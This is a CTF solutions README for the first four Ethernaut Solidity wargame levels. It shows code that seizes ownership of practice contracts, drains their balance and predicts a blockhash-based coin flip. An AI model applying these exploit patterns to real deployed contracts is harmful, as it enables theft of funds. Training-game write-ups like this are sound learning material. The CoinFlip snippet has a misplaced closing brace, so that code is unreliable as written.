# The Ethernaut CTF Challenge Solutions

_The Ethernaut is a Web3/Solidity based wargame inspired by [overthewire.org](https://overthewire.org/wargames/), played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'. The game is 100% open source and all levels are contributions made by other players._

Brief solutions for OpenZeppelin's Ethernaut CTF. Writeups pending.

**Completed**

[Level 0: Hello Ethernaut](#HelloEthernaut)  
[Level 1: Fallback](#Fallback)  
[Level 2: Fallout](#Fallout)  
[Level 3: Coin Flip](#CoinFlip)

<!---

**Pending**
[Level 4: Telephone](#Telephone)
[Level 5: Token](#Token)
[Level 6: Delegation](#Delegation)
[Level 7: Force](#Force)
[Level 8: Vault](#Vault)
[Level 9: King](#King)
[Level 10: Re-entrancy](#Reentrancy)
[Level 11: Elevator](#Elevator)
[Level 12: Privacy](#Privacy)
[Level 13: Gatekeeper One](#GatekeeperOne)
[Level 14: Gatekeeper Two](#GatekeeperTwo)
[Level 15: Naught Coin](#NaughtCoin)
[Level 16: Preservation](#Preservation)
[Level 17: Recovery](#Recovery)
[Level 18: Magic Number](#MagicNumber)
[Level 19: Alien Codex](#AlienCodex)
[Level 20: Denial](#Denial)
[Level 21: Shop](#Shop)
[Level 22: Dex](#Dex)
[Level 23: Dex Two](#DexTwo)
[Level 24: Puzzle Wallet](#PuzzleWallet)
[Level 25: Motorbike](#Motorbike)
[Level 26: Double Entry Point](#DoubleEntryPoint)
[Level 27: Good Samaritan](#GoodSamaritan)
-->

## Requirements

- [Metamask](https://metamask.io/)

## <a name='HelloEthernaut'></a> 0. Hello Ethernaut

> This level walks you through the very basics of how to play the game.

```js
// We call the functions in the order as suggested
> await contract.info()
< 'You will find what you need in info1().'

> await contract.info1()
< 'Try info2(), but with "hello" as a parameter.'

> await contract.info2("hello")
< 'The property infoNum holds the number of the next info method to call.'

> x = contract.infoNum()
// We expand the promise to reveal "42"

> await contract.info42()
< 'theMethodName is the name of the next method.'

> await contract.theMethodName()
< 'The method name is method7123949.'

> await contract.method7123949()
< 'If you know the password, submit it to authenticate().'

> await contract.password()
< 'ethernaut0'

> await contract.authenticate("ethernaut0")
```

## <a name='Fallback'></a> 1. Fallback

> You will beat this level if:
>
> 1. You claim ownership of the contract
> 2. You reduce its balance to 0

```js
// First, we contribute some ether:
await contract.contribute({ value: 5 });

// Then we send some ether to make us the owner
sendTransaction({ from: player, to: instance, value: 5 });

// Verify we have claimed ownership
await contract.owner();

// Reduce balance to 0
await contract.withdraw();
```

## <a name='Fallout'></a> 2. Fallout

> Claim ownership of the contract to complete this level.

The contract's constructor is incorrectly titled `Fal1out` instead of `Fallout`. We can call it to claim ownership.

```js
// Call the function to claim ownership
contract.Fal1out();

// Verify we have claimed ownership
await contract.owner();
```

## <a name='CoinFlip'></a> 3. Coin Flip

> "Use your psychic abilities" to guess the correct outcome 10 times in a row.

In order to solve, we have a few objectives:

1. Set the contract instance as our target contract
2. Recreate the flip() function
3. Pass the flip() output into the target instance

Let's begin with recreating a portion of the flip() function. We will replicate useful variables of the original function.

```js
uint256 lastHash;
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```

Now, let's setup the target contract. This supports our first objective.

```js
CoinFlip public targetContract;
```

Next, we will create the constructor to receive our target address (for the deployed instance). This completes our first objective.

```js
constructor(address _targetAddr) public {
  targetContract = CoinFlip(_targetAddr);
  }
```

Let's replicate the remaining essential aspects of the flip() function. This completes our second objective.

```js
  function flipSolve() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    }
    if (lastHash == blockValue) {
      revert();
      }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
```
Finally, we will pass the side value into the original contract, ensuring our guess is always correct. This completes our final objective.
```js
targetContract.flip(side);
```
We patiently call `flipSolve()` 10 times until we have guessed correctly 10 times and solve the level.